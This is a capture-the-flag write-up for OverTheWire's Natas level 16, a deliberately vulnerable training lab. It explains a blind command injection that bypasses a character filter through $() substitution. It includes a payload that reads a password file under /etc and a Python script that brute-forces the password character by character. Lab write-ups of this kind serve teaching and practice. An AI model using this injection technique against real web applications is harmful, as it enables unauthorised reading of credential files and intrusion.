# Natas Level 15 → Level 16

## Objective
Retrieve the Natas 17 password by exploiting a blind command injection vulnerability through command substitution.

## Details
* **Vulnerability:** Blind Command Injection (Command Substitution)
* **Filtered Characters:** `;`, `&`, `|`, `'`, `"`
* **Tools Used:** Python (Requests library), `$()` substitution, Grep

## Process
* Observed that the application filters common command separators but remains vulnerable to command substitution `$()`.
* Used a dictionary word ("Africans") as a truth-anchor to perform a boolean leakage attack.
* Realized the grep command is executed as: `grep -i "$key" dictionary.txt`.
* Injected the payload: `$(grep ^[pattern] /etc/natas_webpass/natas17)Africans`.
* If the nested `grep` finds the password character, the word "Africans" disappears from the response, allowing for character-by-character extraction.

## Exploit Script
```python
import requests
from requests.auth import HTTPBasicAuth

target = "[http://natas16.natas.labs.overthewire.org/](http://natas16.natas.labs.overthewire.org/)"
auth = HTTPBasicAuth('natas16', 'Password_Here')
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

for i in range(32):
    for char in chars:
        payload = f"$(grep ^{password}{char} /etc/natas_webpass/natas17)Africans"
        r = requests.get(target, params={'needle': payload}, auth=auth)
        if "Africans" not in r.text:
            password += char
            print(f"Found: {password}")
            break
